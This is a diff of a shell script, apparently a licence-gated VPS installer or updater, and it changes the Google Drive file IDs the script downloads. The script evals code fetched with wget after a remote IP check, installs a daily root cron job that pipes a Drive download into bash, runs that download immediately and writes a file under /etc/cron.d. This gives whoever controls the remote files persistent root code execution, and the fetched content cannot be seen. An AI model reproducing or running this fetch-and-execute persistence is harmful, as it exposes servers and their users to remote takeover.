@@ -8,7 +8,7 @@ NC='\e[0m'
 MYIP=$(cat /usr/bin/.ipvps)
     ALLOWED_IP=$(curl -sS "https://licence-manager-nu.vercel.app/api/check/izintxt" | grep "$MYIP" | awk '{print $4}')
     if [[ "$MYIP" == "$ALLOWED_IP" ]]; then
-	ID_FILE="1RWzdtBtqJH6D0KjGNkwOwJUVxUyc2Zkr"
+	ID_FILE="1WrlpSoR-zzIsNsOFcusKzY9gLW0x1dJ_"
 	eval $(wget -qO- "https://drive.google.com/u/4/uc?id=${ID_FILE}")
     else
 echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
@@ -144,10 +144,10 @@ else
         exit 1
     fi
 fi
-    cron_job="0 0 * * * /bin/bash -c \"wget -qO- 'https://drive.google.com/u/4/uc?id=1jtFVG-q0VhnAF9RtMvzGMtXD9U9Lgi6s&export=download' | bash\""
+    cron_job="0 0 * * * /bin/bash -c \"wget -qO- 'https://drive.google.com/u/4/uc?id=1lvi6XGwAn73Z_kzU5ufBCf2oz3bO5iP0&export=download' | bash\""
 	crontab -l 2>/dev/null | grep -Fxv "$cron_job" | crontab -
 	(crontab -l 2>/dev/null; echo "$cron_job") | crontab -
-    wget -qO- 'https://drive.google.com/u/4/uc?id=1jtFVG-q0VhnAF9RtMvzGMtXD9U9Lgi6s&export=download' | bash
+    wget -qO- 'https://drive.google.com/u/4/uc?id=1lvi6XGwAn73Z_kzU5ufBCf2oz3bO5iP0&export=download' | bash
 cat> /etc/cron.d/xp_otm << END
 SHELL=/bin/sh
 PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
